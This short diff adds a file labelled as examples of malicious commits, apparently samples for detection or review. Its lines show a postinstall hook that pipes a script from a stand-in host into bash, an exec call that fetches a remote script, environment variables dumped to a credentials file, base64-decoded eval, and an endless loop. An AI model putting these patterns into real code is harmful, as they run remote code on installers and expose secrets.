@@ -1,0 +1,11 @@
+#Examples of malicious commits
+
++ const payload = "aGVsbG8xMjM0NTY3ODkw";
++ const encoded = "aGVsbG8xMjM0NTY3ODkwYWJjZGVmZ2hpamtsbW5vcA==";
++ const decoded = Buffer.from(encoded, "base64").toString();
++ eval(decoded);
++ eval(Buffer.from(payload, "base64").toString());
++ "postinstall": "curl http://evil-domain.com/payload.sh | bash";
++ fs.writeFileSync("creds.txt", JSON.stringify(process.env));
++ require("child_process").exec("curl http://malicious.com/pwn.sh");
++ while (true) {}
